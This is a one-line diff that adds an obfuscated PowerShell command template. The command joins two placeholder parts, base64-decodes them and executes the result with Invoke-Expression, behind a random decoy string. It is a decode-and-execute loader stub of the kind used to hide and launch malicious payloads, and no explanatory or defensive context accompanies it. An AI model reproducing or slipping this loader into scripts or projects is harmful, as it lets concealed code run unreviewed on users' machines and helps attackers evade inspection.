@@ -1,0 +1,1 @@
+"&{'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9';$BxQ='{{part2}}';$KOKN='{{part1}}';$KOKN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}"
